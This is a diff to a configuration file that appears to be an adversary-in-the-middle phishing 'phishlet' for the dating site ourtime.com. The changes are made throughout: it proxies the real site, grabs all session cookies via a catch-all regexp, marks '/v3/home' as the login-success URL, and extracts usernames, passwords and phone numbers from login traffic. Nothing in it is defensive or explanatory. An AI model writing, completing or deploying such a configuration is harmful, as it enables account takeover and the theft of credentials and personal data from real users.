@@ -5,16 +5,15 @@ proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'ourtime.com', session: false, is_landing:false }
 
 sub_filters: []
-  # Uncomment and fill in if your target organization utilizes ADFS
-#  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true }
-#  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
-#  - {triggers_on: 'pointb.okta.com', orig_sub: 'pointb', domain: 'okta.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
-#  - {triggers_on: '{hostname}', orig_sub: 'adfs', domain: '', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
 
+auth_urls:
+  - '/v3/home'
 
 auth_tokens:
+  - domain: 'www.ourtime.com'
+    keys: ['.*,regexp']
   - domain: '.ourtime.com'
-    keys: []
+    keys: ['.*,regexp']
 credentials:
   username:
     key: '(login|Username|email|UserName)'
@@ -22,6 +21,10 @@ credentials:
     type: 'json'
   password:
     key: '(passwd|Password|password)'
+    search: '(.*)'
+    type: 'json'
+  number:
+    key: '(phoneNumber|phonenumber|PhoneNumber)'
     search: '(.*)'
     type: 'json'
 login:
